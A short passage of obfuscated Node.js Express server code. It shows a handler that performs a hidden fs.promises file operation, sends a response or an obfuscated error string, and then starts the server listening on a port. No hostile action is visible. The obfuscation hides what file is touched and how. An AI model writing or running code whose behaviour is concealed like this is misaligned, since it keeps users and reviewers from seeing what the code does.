fs['promises'][_0x58713c(0x286)](_0x20c1cb,_0x58713c(0x251));_0x3b05e4[_0x58713c(0x212)](_0x5de23c);}catch(_0x451cbf){_0x3b05e4['send'](_0x58713c(0x248));}}),app['listen'](PORT,()=>console[_0x1c5993(0x20f)]('http\x20server\x20is\x20running\x20on\x20port:'+PORT+'!'));
